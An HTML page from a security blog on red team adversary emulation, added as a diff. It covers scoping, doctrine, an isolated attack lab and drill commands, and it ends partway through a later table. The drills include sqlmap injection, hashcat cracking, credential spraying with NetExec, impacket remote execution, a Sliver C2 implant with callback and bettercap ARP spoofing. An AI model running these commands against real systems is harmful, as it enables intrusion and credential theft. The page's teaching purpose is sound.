@@ -1,0 +1,1562 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Red Teams: Adversary Emulation — Labs, Tools, Doctrine</title>
+<meta name="description" content="Red team operations in depth: adversary emulation doctrine, a buildable attack lab, the tool stack by ATT&amp;CK phase, and the documents behind it.">
+<link rel="canonical" href="https://blog.odicforcesounds.com/RedTeams.html">
+<meta property="og:title" content="Red Teams: Adversary Emulation — Labs, Tools, Doctrine">
+<meta property="og:description" content="Red team operations in depth: adversary emulation doctrine, a buildable attack lab, the tool stack by ATT&amp;CK phase, and the documents behind it.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://blog.odicforcesounds.com/RedTeams.html">
+<meta property="og:site_name" content="Monkey Blog">
+<meta property="og:image" content="https://blog.odicforcesounds.com/images/peace.jpg">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Red Teams: Adversary Emulation — Labs, Tools, Doctrine">
+<meta name="twitter:description" content="Red team operations in depth: adversary emulation doctrine, a buildable attack lab, the tool stack by ATT&amp;CK phase, and the documents behind it.">
+<meta name="twitter:image" content="https://blog.odicforcesounds.com/images/peace.jpg">
+<link rel="icon" href="/favicon.ico" type="image/x-icon">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "BlogPosting",
+      "@id": "https://blog.odicforcesounds.com/RedTeams.html#article",
+      "headline": "Red Teams: Adversary Emulation — Labs, Tools, Doctrine",
+      "description": "Red team operations in depth: adversary emulation doctrine, a buildable attack lab, the tool stack by ATT&CK phase, and the documents behind it.",
+      "url": "https://blog.odicforcesounds.com/RedTeams.html",
+      "mainEntityOfPage": { "@type": "WebPage", "@id": "https://blog.odicforcesounds.com/RedTeams.html" },
+      "image": { "@type": "ImageObject", "url": "https://blog.odicforcesounds.com/images/peace.jpg", "width": 1496, "height": 960 },
+      "inLanguage": "en",
+      "author": { "@type": "Person", "name": "Oscar", "url": "https://blog.odicforcesounds.com/" },
+      "publisher": {
+        "@type": "Organization",
+        "name": "Monkey Blog",
+        "url": "https://blog.odicforcesounds.com/",
+        "logo": { "@type": "ImageObject", "url": "https://blog.odicforcesounds.com/images/three.jpg", "width": 1024, "height": 1024 }
+      },
+      "isPartOf": { "@type": "Blog", "name": "Monkey Blog", "url": "https://blog.odicforcesounds.com/" },
+      "articleSection": "Security & Hacking",
+      "keywords": "red team, adversary emulation, ATT&CK, lab, C2, OPSEC, TIBER-EU, rules of engagement",
+      "wordCount": 9329,
+      "datePublished": "2026-10-31",
+      "dateModified": "2026-10-31"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        { "@type": "ListItem", "position": 1, "name": "Home", "item": "https://blog.odicforcesounds.com/" },
+        { "@type": "ListItem", "position": 2, "name": "Security & Hacking", "item": "https://blog.odicforcesounds.com/#category-security-and-hacking" },
+        { "@type": "ListItem", "position": 3, "name": "Red Teams", "item": "https://blog.odicforcesounds.com/RedTeams.html" }
+      ]
+    }
+  ]
+}
+</script>
+<style>
+:root{
+  --bg:#08060a;
+  --panel:#110a0e;
+  --panel2:#180d12;
+  --ink:#f4ecee;
+  --soft:#d2c6c9;
+  --muted:#a2949a;
+  --red:#ff3b4e;
+  --ember:#ff7a18;
+  --gold:#ffd166;
+  --violet:#b45cff;
+  --line:rgba(255,255,255,.11);
+  --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace;
+  --sans:system-ui,-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  margin:0;
+  min-height:100vh;
+  color:var(--ink);
+  background-color:var(--bg);
+  background-image:
+    radial-gradient(900px 520px at 88% -8%,rgba(255,59,78,.16),transparent 62%),
+    radial-gradient(760px 520px at 4% 18%,rgba(180,92,255,.12),transparent 60%),
+    radial-gradient(900px 620px at 96% 82%,rgba(255,122,24,.12),transparent 58%),
+    linear-gradient(180deg,#08060a,#0a070d 55%,#070509);
+  background-attachment:fixed;
+  background-repeat:no-repeat;
+  font:16px/1.7 var(--sans);
+}
+a{color:#ff9aa5;text-decoration:none;border-bottom:1px solid rgba(255,59,78,.35);transition:color .15s,border-color .15s}
+a:hover{color:var(--gold);border-bottom-color:var(--gold)}
+:focus-visible{outline:2px solid var(--gold);outline-offset:3px}
+[data-lang-block][hidden]{display:none!important}
+::selection{background:var(--red);color:#12030a}
+
+/* language switch */
+.lang-switch{
+  display:flex;justify-content:center;gap:.4rem;
+  padding:.9rem 1rem .3rem;
+  font-family:var(--mono);font-size:.72rem;
+  letter-spacing:.18em;text-transform:uppercase;
+}
+.lang-switch a{
+  padding:.32rem .95rem;
+  color:var(--red);font-weight:600;
+  background:transparent;
+  border:1px solid rgba(255,59,78,.6);border-radius:999px;
+  opacity:.85;
+  transition:opacity .15s,background-color .15s,color .15s,border-color .15s;
+}
+.lang-switch a[aria-current="true"]{color:var(--bg);background:var(--red);border-color:var(--red);opacity:1}
+.lang-switch a:hover,.lang-switch a:focus-visible{color:#12030a;background:var(--gold);border-color:var(--gold);opacity:1}
+
+/* shell */
+.wrap{max-width:1080px;margin:0 auto;padding:0 clamp(1rem,4vw,2rem)}
+.topbar{
+  position:sticky;top:0;z-index:20;
+  display:flex;align-items:center;gap:.8rem;
+  padding:.7rem 0;
+  background:rgba(8,6,10,.88);
+  -webkit-backdrop-filter:blur(12px);backdrop-filter:blur(12px);
+  border-bottom:1px solid transparent;
+  border-image:linear-gradient(90deg,var(--red),var(--violet) 45%,var(--ember)) 1;
+}
+.home{
+  border:1px solid rgba(255,59,78,.55);border-radius:6px;
+  padding:.28rem .7rem;
+  font-family:var(--mono);font-size:.68rem;letter-spacing:.12em;text-transform:uppercase;
+  color:#ff9aa5;background:rgba(255,59,78,.08);
+}
+.home:hover{background:var(--gold);border-color:var(--gold);color:#12030a}
+.brand{margin-left:auto;font-family:var(--mono);font-size:.66rem;letter-spacing:.26em;text-transform:uppercase;color:var(--muted)}
+.brand b{color:var(--red)}
+
+/* hero */
+.hero{padding:clamp(2rem,6vw,3.4rem) 0 .6rem}
+.kicker{margin:0 0 .8rem;color:var(--ember);font-family:var(--mono);font-size:.66rem;letter-spacing:.26em;text-transform:uppercase}
+h1,.seo-h2{
+  margin:0;
+  font-size:clamp(1.9rem,5vw,3.2rem);
+  line-height:1.08;letter-spacing:-.02em;
+  background:linear-gradient(100deg,#fff 6%,var(--red) 42%,var(--ember) 68%,var(--gold));
+  -webkit-background-clip:text;background-clip:text;
+  color:transparent;
+}
+.lede{max-width:66ch;margin:1.1rem 0 0;color:var(--soft);font-size:1.02rem}
+.lede b{color:#fff}
+.meta-line{display:flex;flex-wrap:wrap;gap:.4rem;margin:1.1rem 0 0}
+.chip{
+  border:1px solid rgba(255,59,78,.35);border-radius:99px;
+  padding:.22rem .7rem;background:rgba(255,59,78,.07);
+  font-family:var(--mono);font-size:.58rem;letter-spacing:.1em;text-transform:uppercase;color:#ff9aa5;
+}
+.chip.dim{border-color:var(--line);background:rgba(255,255,255,.03);color:var(--muted)}
+
+/* contents: option links */
+.toc{
+  margin:1.6rem 0 2rem;padding:1rem 1.1rem;
+  border:1px solid var(--line);border-radius:12px;
+  background:linear-gradient(160deg,rgba(24,13,18,.9),rgba(12,8,11,.9));
+}
+.toc h2{margin:0 0 .6rem;font-family:var(--mono);font-size:.7rem;letter-spacing:.2em;text-transform:uppercase;color:var(--gold)}
+.toc ol{list-style:none;margin:0;padding:0;display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:.3rem}
+.toc a{
+  display:flex;gap:.55rem;align-items:baseline;
+  padding:.36rem .6rem;border:1px solid transparent;border-radius:7px;
+  color:var(--soft);border-bottom:0;
+}
+.toc a span{font-family:var(--mono);font-size:.62rem;color:var(--red)}
+.toc a:hover,.toc a:focus-visible{background:rgba(255,59,78,.12);border-color:rgba(255,59,78,.5);color:#fff}
+
+/* sections */
+main section{padding:1.6rem 0;border-top:1px solid var(--line)}
+main section:first-of-type{border-top:0}
+h2{font-size:clamp(1.35rem,3vw,1.8rem);line-height:1.2;margin:0 0 .7rem;letter-spacing:-.01em;color:#fff}
+h2 .no{font-family:var(--mono);font-size:.72em;color:var(--red);margin-right:.4rem}
+h3{margin:1.5rem 0 .5rem;font-family:var(--mono);font-size:.92rem;letter-spacing:.08em;text-transform:uppercase;color:var(--ember)}
+p{color:var(--soft);max-width:88ch}
+b,strong{color:#fff}
+em{color:var(--gold);font-style:normal}
+ul,ol{color:var(--soft);padding-left:1.2rem}
+li{margin:.32rem 0}
+li b{color:#fff}
+code{font-family:var(--mono);font-size:.84em;background:#2a0d14;color:var(--gold);padding:.06em .32em;border-radius:3px;word-break:break-word}
+pre{
+  margin:1rem 0;padding:.9rem 1rem;overflow-x:auto;
+  background:linear-gradient(180deg,#120a10,#08050a);
+  border:1px solid rgba(255,59,78,.32);border-left:3px solid var(--red);border-radius:9px;
+  color:#ffd9de;font:400 .76rem/1.65 var(--mono);
+}
+pre code{background:none;color:inherit;padding:0}
+pre .c{color:#8b7f86}
+
+/* tables */
+.table-wrap{margin:1rem 0;border:1px solid var(--line);border-radius:10px;overflow-x:auto;background:rgba(0,0,0,.28)}
+table{width:100%;border-collapse:collapse;font-size:.82rem;min-width:560px}
+th{
+  text-align:left;padding:.6rem .7rem;white-space:nowrap;
+  background:linear-gradient(180deg,#1b0d13,#120a0f);
+  color:var(--red);border-bottom:2px solid var(--red);
+  font-family:var(--mono);font-size:.6rem;letter-spacing:.1em;text-transform:uppercase;
+}
+td{padding:.55rem .7rem;border-bottom:1px solid var(--line);color:var(--soft);vertical-align:top}
+tbody tr:nth-child(even) td{background:rgba(255,59,78,.045)}
+tbody tr:last-child td{border-bottom:0}
+td:first-child{color:#fff;font-family:var(--mono);font-size:.74rem;white-space:nowrap}
+
+/* callouts */
+.callout{
+  margin:1.2rem 0;padding:.95rem 1.1rem;border-radius:9px;
+  border:1px solid var(--line);border-left:4px solid var(--red);
+  background:linear-gradient(100deg,rgba(255,59,78,.11),rgba(180,92,255,.05));
+}
+.callout h4{margin:0 0 .3rem;font-family:var(--mono);font-size:.62rem;letter-spacing:.16em;text-transform:uppercase;color:var(--red)}
+.callout.law{border-left-color:var(--gold);background:linear-gradient(100deg,rgba(255,209,102,.10),rgba(255,122,24,.05))}
+.callout.law h4{color:var(--gold)}
+.callout.note{border-left-color:var(--violet);background:linear-gradient(100deg,rgba(180,92,255,.12),rgba(255,59,78,.05))}
+.callout.note h4{color:#c894ff}
+.callout p{margin:.3rem 0;font-size:.88rem;max-width:none}
+.callout p:last-child{margin-bottom:0}
+
+/* cross links */
+.next{display:flex;flex-wrap:wrap;gap:.5rem;margin:1.4rem 0 0}
+.next a{
+  border:1px solid rgba(180,92,255,.55);border-radius:8px;
+  padding:.45rem .85rem;background:rgba(180,92,255,.10);
+  font-family:var(--mono);font-size:.68rem;letter-spacing:.1em;text-transform:uppercase;color:#d0a8ff;
+}
+.next a:hover,.next a:focus-visible{background:var(--gold);border-color:var(--gold);color:#12030a}
+
+footer{
+  margin-top:2rem;padding:1.6rem 0 2.4rem;text-align:center;
+  border-top:2px solid transparent;
+  background:
+    linear-gradient(#0c0710,#0c0710) padding-box,
+    linear-gradient(90deg,var(--red),var(--violet),var(--ember),var(--gold)) border-box;
+}
+footer p{margin:.3rem auto;color:var(--muted);font-size:.78rem;max-width:80ch;text-align:center}
+footer .home{margin-top:.7rem;display:inline-block}
+@media (max-width:640px){
+  table{min-width:480px}
+  .toc ol{grid-template-columns:1fr}
+}
+@media (prefers-reduced-motion:reduce){
+  html{scroll-behavior:auto}
+  *{transition-duration:.01ms!important;animation-duration:.01ms!important}
+}
+@media print{
+  body{background:#fff;color:#111}
+  .lang-switch,.topbar,footer .home{display:none!important}
+  h1,.seo-h2{color:#111;-webkit-text-fill-color:#111}
+  pre,table,.callout{background:#fff!important;border-color:#999!important}
+  p,td,li,pre{color:#111!important}
+}
+</style>
+</head>
+<body>
+
+<nav class="lang-switch" aria-label="Language">
+  <a href="?lang=pt" data-lang-switch="pt" lang="pt-PT">Português</a>
+  <a href="?lang=en" data-lang-switch="en" aria-current="true" lang="en">English</a>
+</nav>
+
+<div id="lang-en" data-lang-block="en">
+<header class="topbar">
+  <div class="wrap" style="display:flex;align-items:center;gap:.8rem;flex:1">
+    <a class="home" href="./index.html">Home</a>
+    <span class="brand">Red <b>/</b> Teams</span>
+  </div>
+</header>
+
+<main class="wrap">
+  <div class="hero">
+    <p class="kicker">Adversary emulation &middot; doctrine, lab, tooling</p>
+    <h1>Red Teams: emulating an adversary, not running a scanner</h1>
+    <p class="lede">
+      A red team is measured by the objective it reaches and the evidence it leaves behind, not by the
+      number of alerts it generates. This page is the working half of that idea: how engagements are
+      scoped, which <b>documents</b> define the tradecraft, how to build a <b>lab</b> you can burn without
+      burning a client, and which <b>tools</b> answer which question at each phase.
+    </p>
+    <div class="meta-line">
+      <span class="chip">authorised targets only</span>
+      <span class="chip dim">12 tool groups</span>
+      <span class="chip dim">5 lab components</span>
+      <span class="chip dim">6 doctrines</span>
+    </div>
+  </div>
+
+  <nav class="toc" aria-labelledby="toc-title">
+    <h2 id="toc-title">Contents</h2>
+    <ol>
+      <li><a href="#what"><span>01</span> Red team, pentest, scan</a></li>
+      <li><a href="#scope"><span>02</span> Scope and rules of engagement</a></li>
+      <li><a href="#doctrine"><span>03</span> The documents that define the work</a></li>
+      <li><a href="#lab"><span>04</span> Build an attack lab</a></li>
+      <li><a href="#walkthrough"><span>05</span> Walkthrough: from nothing to hacking</a></li>
+      <li><a href="#tools"><span>06</span> Tool map by phase</a></li>
+      <li><a href="#setup"><span>07</span> Setup: installing every tool</a></li>
+      <li><a href="#infra"><span>08</span> C2, redirectors and OPSEC</a></li>
+      <li><a href="#emulation"><span>09</span> Emulation frameworks</a></li>
+      <li><a href="#handoff"><span>10</span> Purple handoff and reporting</a></li>
+      <li><a href="#sources"><span>11</span> Sources and further reading</a></li>
+    </ol>
+  </nav>
+
+  <section id="what">
+    <h2><span class="no">01</span> Red team, pentest, scan</h2>
+    <p>
+      The words are used interchangeably in sales decks and that is where most disappointment begins.
+      A vulnerability scan enumerates; a penetration test proves a finding on an agreed asset list; a red
+      team is given an <b>objective</b> — a specific data store, a domain admin, a production change — and
+      is judged on whether it gets there without being detected for an agreed period.
+    </p>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Engagement</th><th>Question answered</th><th>Success looks like</th><th>Typical shape</th></tr></thead>
+        <tbody>
+          <tr><td>Vulnerability assessment</td><td>What is out of date or misconfigured?</td><td>A prioritised list with evidence</td><td>Days, tool-driven, broad</td></tr>
+          <tr><td>Penetration test</td><td>Can these specific findings be exploited?</td><td>Proof per finding, with remediation</td><td>One to three weeks, asset list</td></tr>
+          <tr><td>Red team</td><td>Can a realistic adversary reach the objective?</td><td>Objective reached, detection timeline reported</td><td>Weeks, stealth-weighted, few targets</td></tr>
+          <tr><td>Adversary emulation</td><td>Do our detections catch this known actor?</td><td>Coverage map of techniques, not a breach</td><td>Days, TTP-driven, instrumented</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p>
+      Emulation is the strictest and most useful of the four: you pick a threat actor that actually targets
+      your sector, replay its techniques in order, and measure what the defenders saw. The difference
+      between "we got domain admin" and "we got domain admin in 40 minutes and nobody noticed" is the whole
+      deliverable.
+    </p>
+  </section>
+
+  <section id="scope">
+    <h2><span class="no">02</span> Scope and rules of engagement</h2>
+    <p>
+      Everything below assumes a signed scope, a named deconfliction contact and a stop condition. Without
+      those three, the same commands are a criminal offence — capability is not permission. The
+      <a href="KaliLinux.html">manual</a> covers the legal baseline in detail; here is the operational
+      version used to build a red team RoE.
+    </p>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>RoE field</th><th>What it must say</th><th>Why red teams get it wrong</th></tr></thead>
+        <tbody>
+          <tr><td>Objective</td><td>The exact asset, account or outcome that counts as success</td><td>"Get in somehow" produces an unfalsifiable report</td></tr>
+          <tr><td>Targets</td><td>Domains, IPs, tenants, offices, people in scope — plus exclusions</td><td>Third-party SaaS and cloud regions silently enter scope</td></tr>
+          <tr><td>Techniques</td><td>Allowed, discouraged and forbidden actions, by name</td><td>Nobody wrote down "no social engineering"</td></tr>
+          <tr><td>Deconfliction</td><td>Who knows, how they are reached, how a test is proved genuine</td><td>The blue team escalates a real incident mid-engagement</td></tr>
+          <tr><td>Stop</td><td>Conditions that end the test immediately, and who may call them</td><td>Outages and safety incidents have no agreed brake</td></tr>
+          <tr><td>Data</td><td>What may be taken, where it lives, when it is destroyed</td><td>Client records end up in a screenshot folder</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="callout law">
+      <h4>Write the get-out-of-jail letter before the first packet</h4>
+      <p>
+        The authorisation should name the testers, the dates, the assets, the permitted techniques and a
+        contact who can confirm the engagement at any hour. If an operator is stopped by a system owner at
+        two in the morning, that document is the difference between an incident and a phone call. Keep it
+        offline as well as on the phone.
+      </p>
+    </div>
+  </section>
+
+  <section id="doctrine">
+    <h2><span class="no">03</span> The documents that define the work</h2>
+    <p>
+      Red teaming has a literature. Reading it once turns improvisation into a repeatable method, and it is
+      what separates a report a client can act on from a wall of screenshots.
+    </p>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Document</th><th>Publisher</th><th>What you take from it</th></tr></thead>
+        <tbody>
+          <tr><td>ATT&amp;CK</td><td>MITRE</td><td>The tactic and technique vocabulary every finding is mapped to</td></tr>
+          <tr><td>Adversary Emulation Library</td><td>MITRE Engenuity</td><td>Ready-made emulation plans per threat group</td></tr>
+          <tr><td>TIBER-EU</td><td>European Central Bank</td><td>Threat-intelligence-led red teaming for financial entities</td></tr>
+          <tr><td>CBEST</td><td>Bank of England</td><td>The same idea with UK supervisory reporting hooks</td></tr>
+          <tr><td>PTES</td><td>PTES project</td><td>The phase structure a report is expected to follow</td></tr>
+          <tr><td>SP 800-115</td><td>NIST</td><td>Method for penetration testing and assessment, with evidence guidance</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p>
+      For the defensive half of the same vocabulary, see <a href="learnHacking.html">lab</a>. ATT&amp;CK is
+      also the bridge to <a href="apt.html">APT</a> reporting: an actor profile without technique IDs is
+      folklore, and a technique without telemetry is untestable.
+    </p>
+  </section>
+
+  <section id="lab">
+    <h2><span class="no">04</span> Build an attack lab</h2>
+    <p>
+      Rehearse on systems that cannot call a lawyer. The lab below is deliberately small: one hypervisor,
+      three isolated networks, a Windows domain to attack, a Linux host to pivot through, and a C2 server
+      that only the lab can reach. Everything is snapshotted, because a lab you cannot roll back teaches
+      the wrong lesson about persistence.
+    </p>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Layer</th><th>Build</th><th>Purpose</th><th>Reset</th></tr></thead>
+        <tbody>
+          <tr><td>Hypervisor</td><td>Proxmox VE, or VirtualBox/VMware on a dedicated host</td><td>Snapshots, cloning, network isolation</td><td>Weekly rebuild</td></tr>
+          <tr><td>Attack net</td><td>10.66.0.0/24, no NAT route to the internet</td><td>Kali, C2, redirector VM</td><td>Revert C2 after each drill</td></tr>
+          <tr><td>Target net</td><td>10.66.10.0/24, firewall between the two</td><td>DC, workstations, Linux server, vulnerable apps</td><td>Snapshot per exercise</td></tr>
+          <tr><td>Domain</td><td>Windows Server DC plus two Windows clients, weak-but-realistic policy</td><td>Kerberos, SMB, GPO, tiered admin mistakes</td><td>Rebuild via Ansible/GOAD</td></tr>
+          <tr><td>Targets</td><td>DVWA, Juice Shop, Metasploitable, an old AP you own</td><td>Web, network and wireless practice</td><td>Container recreate</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <pre><code><span class="c"># one isolated bridge, no NAT: the lab cannot reach the internet by accident</span>
+sudo ip link add br-red type bridge
+sudo ip addr add 10.66.0.1/24 dev br-red
+sudo ip link set br-red up
+
+<span class="c"># a web target you are allowed to break</span>
+docker network create --subnet 10.66.10.0/24 redlab
+docker run -d --name juice --net redlab --ip 10.66.10.50 \
+  -p 10.66.10.50:3000:3000 bkimminich/juice-shop
+
+<span class="c"># snapshot the domain controller before every exercise</span>
+virsh snapshot-create-as dc01 baseline-$(date +%F) --description "clean AD"
+
+<span class="c"># and a resolver that cannot leak your real queries</span>
+sudo systemd-resolve --interface br-red --set-dns 10.66.10.10</code></pre>
+    <h3>Lab rules that keep it honest</h3>
+    <ul>
+      <li><b>No lab traffic to the internet.</b> One NAT rule and your test domain starts appearing in outside logs.</li>
+      <li><b>Snapshot before every drill</b> and revert after it. Persistence in the lab is how you learn to clean up.</li>
+      <li><b>Write the command log as you go:</b> <code>script -a lab/$(date +%F).log</code> turns a session into evidence.</li>
+      <li><b>Break the lab on purpose.</b> Restore a domain, corrupt a policy, then fix it — that is the incident you will meet later.</li>
+      <li><b>Keep a second lab for detections.</b> The <a href="BlueTeams.html">defenders</a> need the same topology with sensors attached.</li>
+    </ul>
+  </section>
+
+  <section id="walkthrough">
+    <h2><span class="no">05</span> Walkthrough: from nothing to hacking</h2>
+    <p>
+      The table above is the plan; this is the build. Work through it in order, because a lab that fails at
+      step two turns every later result into a guess. Every command assumes a Debian host with virtualisation
+      and a lab that cannot reach the internet.
+    </p>
+
+    <h3>0. Starting from nothing</h3>
+    <p>
+      Before a hypervisor there is a laptop, a terminal and a lot of theory. The order that works: Linux and
+      the shell, then how packets actually move, then a scripting language so the tooling repeats itself, then
+      this lab. A week per stage is enough if you finish the exercises instead of reading them.
+    </p>
+    <ul>
+      <li><b>Linux and the shell.</b> Files, permissions, services, logs, and enough <a href="bashScripting.html">Bash</a> to loop over a target list without copying commands by hand.</li>
+      <li><b>Networking.</b> TCP and UDP <a href="tcpudp.html">packets</a>, <a href="dnsProtocol.html">DNS</a>, <a href="httpProtocol.html">HTTP</a>, and the rest of the <a href="networking.html">networking</a> manual.</li>
+      <li><b>Coding.</b> <a href="pythonCert.html">Python</a> to parse scan output and call APIs, <a href="curlManual.html">curl</a> for the raw request, and the <a href="python-cli.html">cli</a> habit of building one small tool per repetitive task.</li>
+      <li><b>Containers.</b> The <a href="docker.html">Docker</a> manual, because half the targets in this lab are one container away.</li>
+    </ul>
+
+    <h3>1. Host and hypervisor</h3>
+    <pre><code>sudo apt install -y qemu-kvm libvirt-daemon-system virtinst libosinfo-bin
+sudo usermod -aG libvirt,kvm "$USER"   <span class="c"># log out and back in</span>
+virt-host-validate                     <span class="c"># the KVM answers must be OK</span></code></pre>
+
+    <h3>2. Two isolated networks, no NAT</h3>
+    <pre><code>cat &gt; /tmp/red-attack.xml &lt;&lt;'XML'
+&lt;network&gt;
+  &lt;name&gt;red-attack&lt;/name&gt;
+  &lt;bridge name="virbr-reda"/&gt;
+  &lt;ip address="10.66.0.1" netmask="255.255.255.0"&gt;
+    &lt;dhcp&gt;&lt;range start="10.66.0.100" end="10.66.0.150"/&gt;&lt;/dhcp&gt;
+  &lt;/ip&gt;
+&lt;/network&gt;
+XML
+virsh net-define /tmp/red-attack.xml
+virsh net-start red-attack &amp;&amp; virsh net-autostart red-attack
+virsh net-list --all</code></pre>
+    <p>
+      Repeat for <code>red-target</code> on <code>10.66.10.0/24</code>. There is deliberately no
+      <code>&lt;forward&gt;</code> element: no route out means no accidental traffic to the outside world.
+    </p>
+
+    <h3>3. The attacker</h3>
+    <pre><code>virt-install --name kali --memory 4096 --vcpus 2 --disk size=40 \
+  --cdrom ~/isos/kali-linux-installer-amd64.iso --network network=red-attack
+
+<span class="c"># inside Kali, after the first boot</span>
+sudo apt update &amp;&amp; sudo apt install -y kali-tools-top10 kali-tools-web
+sudo apt install -y seclists feroxbuster bloodhound.py
+ip -br addr    <span class="c"># must be 10.66.0.x, with no default route to the internet</span></code></pre>
+
+    <h3>4. Targets and a domain</h3>
+    <pre><code><span class="c"># a web target, from the container guide on this blog</span>
+docker run -d --name dvwa --net target --ip 10.66.10.50 -p 80:80 vulnerables/web-dvwa
+docker run -d --name juice --net target --ip 10.66.10.51 -p 3000:3000 bkimminich/juice-shop
+
+<span class="c"># a Linux host to pivot through, and a Windows estate for AD work</span>
+virt-install --name metasploitable --memory 2048 --disk size=20 \
+  --import ~/isos/metasploitable.qcow2 --network network=red-target
+
+<span class="c"># the AD lab: one DC, two clients, deliberately weak policy (GOAD or BadBlood)</span>
+git clone https://github.com/Orange-Cyberdefense/GOAD
+cd GOAD &amp;&amp; ./goad.sh -t install -l GOAD -p virtualbox</code></pre>
+
+    <h3>5. Snapshot, then prove the lab is isolated</h3>
+    <pre><code>for d in dc01 ws01 kali; do virsh snapshot-create-as $d clean --description "pre-drill"; done
+ping -c1 10.66.10.10 &amp;&amp; ping -c1 -W1 1.1.1.1   <span class="c"># second ping must fail</span>
+sudo tcpdump -i virbr-redt -nn -c5   <span class="c"># frames appear, and nothing leaves</span></code></pre>
+
+    <h3>6. Code your own tools</h3>
+    <p>
+      A red team that types every command by hand forgets what it ran. Two small scripts replace the copy-paste:
+      one loops over the target list and saves evidence, the other turns the scanner's XML into the table the
+      report needs. Both are short, and both are exercises from the <a href="bashScripting.html">Bash</a> and
+      <a href="pythonCert.html">Python</a> manuals.
+    </p>
+    <pre><code><span class="c"># sweep.sh — one loop, one evidence directory, no lost output</span>
+#!/usr/bin/env bash
+set -euo pipefail
+mkdir -p ev
+while read -r host; do
+  nmap -sV -Pn -oA "ev/$(echo "$host" | tr . _)" "$host"
+done &lt; targets.txt
+sha256sum ev/*.xml &gt; ev/SHA256SUMS</code></pre>
+    <pre><code><span class="c"># ports.py — the open-port table, straight from the XML</span>
+#!/usr/bin/env python3
+import glob, xml.etree.ElementTree as ET
+
+for path in sorted(glob.glob("ev/*.xml")):
+    for host in ET.parse(path).iter("host"):
+        addr = host.find("address").get("addr")
+        for port in host.iter("port"):
+            if port.find("state").get("state") == "open":
+                name = port.find("service").get("name", "?")
+                print(addr, port.get("portid"), name)</code></pre>
+    <pre><code>chmod +x sweep.sh &amp;&amp; ./sweep.sh &amp;&amp; python3 ports.py &gt; ev/open-ports.txt
+column -t ev/open-ports.txt</code></pre>
+
+    <h3>7. Drills: one question, one tool, one artefact</h3>
+    <p>
+      Each row is a complete test: the question you are answering, the command from the
+      <a href="KaliLinux.html">Kali</a> manual, and what a pass looks like. Save every command with its
+      output — the sensor side of the lab is reading the same traffic, and the
+      <a href="BlueTeams.html">defenders</a> need both halves.
+    </p>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Question</th><th>Command</th><th>A pass looks like</th></tr></thead>
+        <tbody>
+          <tr><td>Which hosts are alive?</td><td><code>nmap -sn 10.66.10.0/24</code></td><td>Three to five hosts, all inside the target range</td></tr>
+          <tr><td>Which TCP ports are open?</td><td><code>nmap -sS -p- --min-rate 1000 -oA ev/tcp 10.66.10.50</code></td><td>A short open list, saved, with a timestamp</td></tr>
+          <tr><td>Which services and versions?</td><td><code>nmap -sCV -p 22,80,3000 --script safe -oA ev/svc 10.66.10.50</code></td><td>Version banners you can compare with a CVE</td></tr>
+          <tr><td>What is the web stack?</td><td><code>whatweb -a 3 http://10.66.10.51:3000</code></td><td>Framework, server and header hints</td></tr>
+          <tr><td>What is hidden?</td><td><code>feroxbuster -u http://10.66.10.50 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 20</code></td><td>A path list, each verified by hand</td></tr>
+          <tr><td>Is the injection real?</td><td><code>sqlmap -u "http://10.66.10.51:3000/rest/products/search?q=1" --level 2 --risk 1 --batch --dbs</code></td><td>A database name, read-only, no data dumped</td></tr>
+          <tr><td>Is the hash weak?</td><td><code>hashcat -m 22000 ev/capture.hc22000 /usr/share/wordlists/rockyou.txt</code></td><td>A recovered key, offline, with the crystal time</td></tr>
+          <tr><td>Where does one identity reach?</td><td><code>bloodhound-python -u bob -p 'Passw0rd!' -d lab.local -ns 10.66.10.10 -c DCOnly --zip</code></td><td>A graph whose shortest path ends at Domain Admin</td></tr>
+          <tr><td>Where does a credential work?</td><td><code>nxc smb 10.66.10.0/24 -u bob -p 'Passw0rd!' -d LAB --shares</code></td><td>A host list with Pwn3d! only where it is true</td></tr>
+          <tr><td>Can I operate on the host?</td><td><code>impacket-wmiexec LAB/bob:'Passw0rd!'@10.66.10.20 whoami</code></td><td>One command, then you stop</td></tr>
+          <tr><td>Does a channel survive the rules?</td><td><code>sliver</code> → <code>mtls --lhost 10.66.0.50 --lport 8888</code> → <code>generate --mtls 10.66.0.50:8888 --os windows</code></td><td>A session, and a log line on the sensor</td></tr>
+          <tr><td>Is the MITM visible?</td><td><code>bettercap -iface eth0</code> → <code>net.probe on</code> → <code>arp.spoof on</code></td><td>Duplicate ARP replies in <a href="tcpdump.html">tcpdump</a>, seen from the sensor too</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3>8. Change the arena: one drill per domain</h3>
+    <p>
+      One lab is not one skill. The same pair of hosts can host seven different engagements, and each one
+      needs its own target, its own tool and its own proof. Add one row per sprint instead of all at once —
+      the chapter list in the <a href="KaliLinux.html">Kali</a> manual already splits the tooling this way.
+    </p>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Domain</th><th>What to add to the lab</th><th>Tool from the manual</th><th>Proof to keep</th></tr></thead>
+        <tbody>
+          <tr><td>System (Linux)</td><td>A Debian guest with a sudo misconfiguration and a world-writable cron</td><td><code>sudo -l</code>, PEASS-ng</td><td>The misconfiguration line plus a root shell transcript</td></tr>
+          <tr><td>System (Windows)</td><td>Unquoted service path, weak service ACL, an old SMB share</td><td>WinPEAS, <code>sc qc</code>, NetExec</td><td>Service state before and after, restored</td></tr>
